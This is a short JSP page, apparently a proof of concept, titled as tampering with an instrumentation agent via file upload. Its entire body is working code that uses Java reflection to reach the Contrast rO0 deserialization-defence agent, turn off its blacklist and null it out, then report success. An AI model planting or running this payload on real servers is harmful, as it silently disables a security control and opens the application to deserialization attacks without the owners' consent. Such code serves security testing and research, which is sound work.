<html>
<body>
<h2>Instrumentation Agent Tampering via File Upload</h2>
<b>Contrast-rO0 Instrumentation Agent Blacklist Disabling</b><hr/><br/>
<br/><h2>
<%
	try {
            Class<?> agent = ClassLoader.getSystemClassLoader()
                    .loadClass("com.contrastsecurity.rO0.RO0Agent");
            java.lang.reflect.Field configField = agent.getField("config");
            Object configObj = configField.get(null);
            Class<?> configClass = configObj.getClass();
            java.lang.reflect.Field blacklistEnabledField = configClass.getDeclaredField("blacklistEnabled");
            blacklistEnabledField.setAccessible(true);
            blacklistEnabledField.setBoolean(configObj, false);
            java.lang.reflect.Field blacklistField = configClass.getDeclaredField("blacklist");
            blacklistField.setAccessible(true);
            blacklistField.set(configObj, null);
	    out.println("Instrumentation agent configuration changed. Blacklist was successfully removed."); 
	}
	catch(Exception e){
            e.printStackTrace();
            out.println("Instrumentation agent configuration failed to change."); 
        }
%>
</h2>
</body>
</html>
